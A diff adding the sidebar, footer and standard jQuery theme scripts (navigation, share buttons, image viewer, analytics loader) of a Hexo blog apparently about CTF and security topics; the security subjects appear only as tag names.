+				<li><a href="/tags/IoT/" title="IoT">IoT<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/wifi密码破解/" title="wifi密码破解">wifi密码破解<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/安恒11月月赛/" title="安恒11月月赛">安恒11月月赛<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/cumt/" title="cumt">cumt<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/cumt双月赛一/" title="cumt双月赛一">cumt双月赛一<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/php变量覆盖/" title="php变量覆盖">php变量覆盖<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/代码审计/" title="代码审计">代码审计<sup>1</sup></a></li>
+			
+		
+		</ul>
+</div>
+
+
+  <div class="linkslist">
+  <p class="asidetitle">Links</p>
+    <ul>
+        
+          <li>
+            
+            	<a href="https://coderq.com" target="_blank" title="一个面向程序员交流分享的新一代社区">码农圈</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://wuchong.me" target="_blank" title="Jark&#39;s Blog">Jark&#39;s Blog</a>
+            
+          </li>
+        
+    </ul>
+</div>
+
+  
+
+
+  <div class="rsspart">
+	<a href="/atom.xml" target="_blank" title="rss">RSS</a>
+</div>
+
+  <div class="weiboshow">
+  <p class="asidetitle">Weibo</p>
+    <iframe width="100%" height="119" class="share_self"  frameborder="0" scrolling="no" src="http://widget.weibo.com/weiboshow/index.php?language=&width=0&height=119&fansRow=2&ptype=1&speed=0&skin=9&isTitle=1&noborder=1&isWeibo=0&isFans=0&uid=&verifier=&dpc=1"></iframe>
+</div>
+
+
+</aside>
+</div>
+    </div>
+    <footer><div id="footer" >
+	
+	<div class="line">
+		<span></span>
+		<div class="author"></div>
+	</div>
+	
+	
+	<section class="info">
+		<p> Good Good Study！ <br/>
+			Day Day Up！</p>
+	</section>
+	 
+	<div class="social-font" class="clearfix">
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+	</div>
+			
+		
+
+		<p class="copyright">
+		Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/wuchong/jacman" target="_blank" title="Jacman">Jacman</a> © 2021 
+		
+		<a href="/about" target="_blank" title="John Doe">John Doe</a>
+		
+		
+		</p>
+</div>
+</footer>
+    <script src="/js/jquery-2.0.3.min.js"></script>
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/jquery.qrcode-0.12.0.min.js"></script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.navbar').click(function(){
+    $('header nav').toggleClass('shownav');
+  });
+  var myWidth = 0;
+  function getSize(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+  };
+  var m = $('#main'),
+      a = $('#asidepart'),
+      c = $('.closeaside'),
+      o = $('.openaside');
+  c.click(function(){
+    a.addClass('fadeOut').css('display', 'none');
+    o.css('display', 'block').addClass('fadeIn');
+    m.addClass('moveMain');
+  });
+  o.click(function(){
+    o.css('display', 'none').removeClass('beforeFadeIn');
+    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
+    m.removeClass('moveMain');
+  });
+  $(window).scroll(function(){
+    o.css("top",Math.max(80,260-$(this).scrollTop()));
+  });
+  
+  $(window).resize(function(){
+    getSize(); 
+    if (myWidth >= 1024) {
+      $('header nav').removeClass('shownav');
+    }else{
+      m.removeClass('moveMain');
+      a.css('display', 'block').removeClass('fadeOut');
+      o.css('display', 'none');
+      
+      $('#toc.toc-aside').css('display', 'none');
+        
+    }
+  });
+});
+</script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var ai = $('.article-content>iframe'),
+      ae = $('.article-content>embed'),
+      t  = $('#toc'),
+      ta = $('#toc.toc-aside'),
+      o  = $('.openaside'),
+      c  = $('.closeaside');
+  if(ai.length>0){
+    ai.wrap('<div class="video-container" />');
+  };
+  if(ae.length>0){
+   ae.wrap('<div class="video-container" />');
+  };
+  c.click(function(){
+    ta.css('display', 'block').addClass('fadeIn');
+  });
+  o.click(function(){
+    ta.css('display', 'none');
+  });
+  $(window).scroll(function(){
+    ta.css("top",Math.max(140,320-$(this).scrollTop()));
+  });
+});
+</script>
+
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var $this = $('.share'),
+      url = $this.attr('data-url'),
+      encodedUrl = encodeURIComponent(url),
+      title = $this.attr('data-title'),
+      tsina = $this.attr('data-tsina'),
+      description = $this.attr('description');
+  var html = [
+  '<div class="hoverqrcode clearfix"></div>',
+  '<a class="overlay" id="qrcode"></a>',
+  '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
+  '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
+  '<a href="#qrcode" class="article-share-qrcode" title="微信"></a>',
+  '<a href="http://widget.renren.com/dialog/share?resourceUrl=' + encodedUrl + '&srcUrl=' + encodedUrl + '&title=' + title +'" class="article-share-renren" target="_blank" title="人人"></a>',
+  '<a href="http://service.weibo.com/share/share.php?title='+title+'&url='+encodedUrl +'&ralateUid='+ tsina +'&searchPic=true&style=number' +'" class="article-share-weibo" target="_blank" title="微博"></a>',
+  '<span title="Share to"></span>'
+  ].join('');
+  $this.append(html);
+
+  $('.hoverqrcode').hide();
+
+  var myWidth = 0;
+  function updatehoverqrcode(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+    var qrsize = myWidth > 1024 ? 200:100;
+    var options = {render: 'image', size: qrsize, fill: '#2ca6cb', text: url, radius: 0.5, quiet: 1};
+    var p = $('.article-share-qrcode').position();
+    $('.hoverqrcode').empty().css('width', qrsize).css('height', qrsize)
+                          .css('left', p.left-qrsize/2+20).css('top', p.top-qrsize-10)
+                          .qrcode(options);
+  };
+  $(window).resize(function(){
+    $('.hoverqrcode').hide();
+  });
+  $('.article-share-qrcode').click(function(){
+    updatehoverqrcode();
+    $('.hoverqrcode').toggle();
+  });
+  $('.article-share-qrcode').hover(function(){}, function(){
+      $('.hoverqrcode').hide();
+  });
+});   
+</script>
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.article-content').each(function(i){
+    $(this).find('img').each(function(){
+      if ($(this).parent().hasClass('fancybox')) return;
+      var alt = this.alt;
+      if (alt) $(this).after('<span class="caption">' + alt + '</span>');
+      $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox"></a>');
+    });
+    $(this).find('.fancybox').each(function(){
+      $(this).attr('rel', 'article' + i);
+    });
+  });
+  if($.fancybox){
+    $('.fancybox').fancybox();
+  }
+}); 
+</script>
+
+
+
+<!-- Analytics Begin -->
+
+
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "//hm.baidu.com/hm.js?";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+
+<!-- Analytics End -->
+
+<!-- Totop Begin -->
+
+	<div id="totop">
+	<a title="Back to Top"><img src="/img/scrollup.png"/></a>
+	</div>
+	<script src="/js/totop.js"></script>
+
+<!-- Totop End -->
+
+<!-- MathJax Begin -->
+<!-- mathjax config similar to math.stackexchange -->
+
+
+<!-- MathJax End -->
+
+<!-- Tiny_search Begin -->
+
+<!-- Tiny_search End -->
+
+  </body>
+</html>
